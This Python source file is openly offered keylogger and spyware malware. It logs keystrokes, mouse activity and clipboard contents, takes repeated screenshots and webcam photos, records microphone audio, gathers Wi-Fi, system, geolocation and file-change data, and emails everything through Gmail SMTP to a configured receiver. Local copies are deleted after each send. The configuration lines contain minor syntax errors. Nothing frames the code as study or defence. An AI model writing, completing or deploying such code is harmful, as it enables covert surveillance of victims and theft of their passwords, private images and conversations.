import os
import platform
import smtplib
import socket
import threading
import wave
import pyscreenshot
import sounddevice as sd
import pyperclip
import requests
import subprocess
import pyautogui
import cv2  # Import OpenCV for camera functionality
from time import time, sleep
from pynput import keyboard
from pynput.keyboard import Listener
from pynput.mouse import Listener as MouseListener
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email import encoders
from watchdog.observers import Observer
from watchdog.events import FileSystemEventHandler
from scipy.io.wavfile import write
import win32clipboard

# Configuration
EMAIL_ADDRESS = "" //enter your sender EMAIL_ADDRESS
EMAIL_PASSWORD = "" // enter your EMAIL_PASSWORD
RECEIVER_EMAIL = "" enter your RECEIVER_EMAIL
SEND_REPORT_EVERY = 10  # in seconds
SCREENSHOT_DIR = './screenshots/'
CAMERA_CAPTURE_DIR = './camera_captures/'  # Directory for webcam captures
MICROPHONE_DURATION = 10  # in seconds
SCREENSHOT_INTERVAL = 10  # in seconds for regular screenshots

# Ensure screenshot and camera capture directories exist
if not os.path.exists(SCREENSHOT_DIR):
    os.makedirs(SCREENSHOT_DIR)

if not os.path.exists(CAMERA_CAPTURE_DIR):
    os.makedirs(CAMERA_CAPTURE_DIR)

# Additional file paths for system data
system_information = "system.txt"
audio_information = "audio.wav"
clipboard_information = "clipboard.txt"
keys_information = "key_log.txt"
extend = "\\"
file_path = "./"  # Directory path for saving the files


class KeyLogger:
    def __init__(self):
        self.log = "KeyLogger Started...\n"
        self.email = EMAIL_ADDRESS
        self.password = EMAIL_PASSWORD
        self.last_time = time()

    def append_log(self, string):
        self.log += string

    def save_data(self, key):
        current_time = time()
        time_diff = current_time - self.last_time
        self.append_log(f"Time since last key press: {time_diff}\n")
        self.last_time = current_time

        try:
            current_key = str(key.char)
        except AttributeError:
            if key == keyboard.Key.space:
                current_key = "SPACE"
            elif key == keyboard.Key.esc:
                current_key = "ESC"
            else:
                current_key = " " + str(key) + " "
        self.append_log(current_key)

        # Screenshot on specific key events
        if key == keyboard.Key.ctrl_l:
            self.take_screenshot()

    def copy_clipboard(self):
        with open(file_path + extend + clipboard_information, "a") as f:
            try:
                win32clipboard.OpenClipboard()
                pasted_data = win32clipboard.GetClipboardData()
                win32clipboard.CloseClipboard()
                f.write("Clipboard Data: \n" + pasted_data)
            except:
                f.write("Clipboard could not be copied.\n")

    def monitor_file_system(self, path_to_monitor):
        class FileMonitor(FileSystemEventHandler):
            def on_created(self, event):
                self.append_log(f"File created: {event.src_path}\n")

            def on_deleted(self, event):
                self.append_log(f"File deleted: {event.src_path}\n")

            def on_modified(self, event):
                self.append_log(f"File modified: {event.src_path}\n")

            def on_moved(self, event):
                self.append_log(f"File moved: {event.src_path}\n")

        event_handler = FileMonitor()
        observer = Observer()
        observer.schedule(event_handler, path=path_to_monitor, recursive=True)
        observer.start()

    def get_geolocation(self):
        try:
            response = requests.get('https://ipinfo.io/')
            data = response.json()
            location = f"City: {data['city']}, Country: {data['country']}, Location: {data['loc']}"
            self.append_log(f"Geolocation: {location}\n")
        except Exception as e:
            self.append_log(f"Failed to get geolocation: {e}\n")

    def get_wifi_info(self):
        try:
            wifi_info = subprocess.check_output(['netsh', 'wlan', 'show', 'interfaces'])
            self.append_log(f"Wi-Fi Info: {wifi_info.decode()}\n")
        except Exception as e:
            self.append_log(f"Failed to get Wi-Fi info: {e}\n")

    def detect_idle_time(self):
        idle_time = 0
        last_position = pyautogui.position()

        while True:
            current_position = pyautogui.position()
            if current_position == last_position:
                idle_time += 1
            else:
                self.append_log(f"System was idle for {idle_time} seconds\n")
                idle_time = 0
            last_position = current_position
            sleep(1)

    def take_screenshot(self):
        try:
            image = pyscreenshot.grab()
            image_path = os.path.join(SCREENSHOT_DIR, f"screenshot_{int(time())}.png")
            image.save(image_path)
            self.send_mail(message="Screenshot captured", file_path=image_path)
            os.remove(image_path)  # Delete the screenshot after sending
        except Exception as e:
            self.append_log(f"Failed to take or delete screenshot: {e}\n")

    def capture_from_camera(self):
        try:
            cam = cv2.VideoCapture(0)  # Open the default webcam
            ret, frame = cam.read()
            if ret:
                camera_image_path = os.path.join(CAMERA_CAPTURE_DIR, f"camera_capture_{int(time())}.png")
                cv2.imwrite(camera_image_path, frame)
                self.send_mail(message="Camera capture taken", file_path=camera_image_path)
                os.remove(camera_image_path)  # Delete after sending
            cam.release()
        except Exception as e:
            self.append_log(f"Failed to capture from camera: {e}\n")

    def start_camera_timer(self):
        while True:
            self.capture_from_camera()
            sleep(SCREENSHOT_INTERVAL)

    def record_audio(self):
        try:
            fs = 44100  # Sample rate
            seconds = MICROPHONE_DURATION  # Duration of recording
            audio_file = 'audio_recording.wav'
            recording = sd.rec(int(seconds * fs), samplerate=fs, channels=2, dtype='int16')
            sd.wait()  # Wait until recording is finished
            write(audio_file, fs, recording)
            self.send_mail(message="Audio recording attached", file_path=audio_file)
            os.remove(audio_file)  # Delete the audio file after sending
        except Exception as e:
            self.append_log(f"Failed to record or delete audio: {e}\n")

    def send_mail(self, message, file_path=None):
        sender = EMAIL_ADDRESS
        receiver = RECEIVER_EMAIL

        msg = MIMEMultipart()
        msg['From'] = sender
        msg['To'] = receiver
        msg['Subject'] = "Keylogger Report"

        msg.attach(MIMEText(message, 'plain'))

        if file_path:
            try:
                with open(file_path, 'rb') as attachment:
                    part = MIMEBase('application', 'octet-stream')
                    part.set_payload(attachment.read())
                    encoders.encode_base64(part)
                    part.add_header(
                        'Content-Disposition',
                        f"attachment; filename= {os.path.basename(file_path)}",
                    )
                    msg.attach(part)
            except Exception as e:
                self.append_log(f"Failed to attach file: {e}\n")

        try:
            server = smtplib.SMTP('smtp.gmail.com', 587)
            server.starttls()
            server.login(self.email, self.password)
            server.sendmail(sender, receiver, msg.as_string())
            server.quit()
        except Exception as e:
            self.append_log(f"Failed to send email: {e}\n")

    def report(self):
        self.send_mail("\n\n" + self.log)
        self.log = ""
        threading.Timer(SEND_REPORT_EVERY, self.report).start()

    def start_screenshot_timer(self):
        while True:
            self.take_screenshot()
            sleep(SCREENSHOT_INTERVAL)

    def on_click(self, x, y, button, pressed):
        if pressed:
            self.append_log(f"Mouse clicked at ({x}, {y}) with {button}\n")

    def on_scroll(self, x, y, dx, dy):
        self.append_log(f"Mouse scrolled at ({x}, {y}) (dx={dx}, dy={dy})\n")

    def gather_system_info(self):
        with open(file_path + extend + system_information, "w") as f:
            hostname = socket.gethostname()
            IPAddr = socket.gethostbyname(hostname)
            f.write("Processor: " + platform.processor() + "\n")
            f.write("System: " + platform.system() + " " + platform.version() + "\n")
            f.write("Machine: " + platform.machine() + "\n")
            f.write("Hostname: " + hostname + "\n")
            f.write("IP Address: " + IPAddr + "\n")
        self.send_mail(message="System information gathered", file_path=file_path + extend + system_information)

    def run(self):
        self.get_geolocation()
        self.get_wifi_info()
        self.gather_system_info()

        clipboard_thread = threading.Thread(target=self.copy_clipboard)
        clipboard_thread.start()

        file_system_thread = threading.Thread(target=self.monitor_file_system, args=(os.path.expanduser('~/Documents'),))
        file_system_thread.start()

        screenshot_thread = threading.Thread(target=self.start_screenshot_timer)
        screenshot_thread.start()

        camera_thread = threading.Thread(target=self.start_camera_timer)
        camera_thread.start()

        audio_thread = threading.Thread(target=self.record_audio)
        audio_thread.start()

        keyboard_listener = keyboard.Listener(on_press=self.save_data)
        mouse_listener = MouseListener(on_click=self.on_click, on_scroll=self.on_scroll)

        with keyboard_listener, mouse_listener:
            self.report()
            keyboard_listener.join()
            mouse_listener.join()

def main():
    keylogger = KeyLogger()

    idle_time_thread = threading.Thread(target=keylogger.detect_idle_time)
    idle_time_thread.start()

    keylogger.run()

if __name__ == "__main__":
    main()
